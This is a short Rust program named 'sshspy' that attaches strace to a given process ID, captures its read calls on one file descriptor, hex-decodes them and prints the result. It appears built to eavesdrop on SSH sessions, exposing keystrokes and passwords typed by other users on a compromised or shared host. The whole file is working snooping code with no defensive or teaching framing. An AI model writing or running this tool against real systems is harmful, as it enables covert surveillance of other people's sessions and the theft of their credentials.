use hex;
use regex::Regex;
use std::env;
use std::io::Write;
use std::io::{self, BufRead, BufReader};
use std::process::{Command, Stdio};

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        println!("Usage: sshspy PID");
        std::process::exit(1);
    }

    let pid = &args[1];
    println!("Attaching to {}", pid);

    let mut child = Command::new("strace")
        .args(["-xx", "-s", "16384", "-p", pid, "-e", "read"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to start strace command");

    let stderr = child.stderr.take().expect("Failed to capture stderr");

    let mut reader = BufReader::new(stderr);
    let re = Regex::new(r#"(?mU)read\(10, "(.*)""#).unwrap();

    loop {
        let mut buf = String::new();
        let _ = reader.read_line(&mut buf);
        buf = buf.replace("\\x", "");

        if let Some(caps) = re.captures(&buf) {
            if let Some(mat) = caps.get(1) {
                let decoded_hex = hex::decode(mat.as_str()).expect("Failed to decode");
                print!(
                    "{}",
                    String::from_utf8(decoded_hex).expect("Failed to encode")
                );
                io::stdout().flush().unwrap();
            }
        }

        if let Ok(Some(_status)) = child.try_wait() {
            println!("Connection closed");
            break;
        }
    }
}
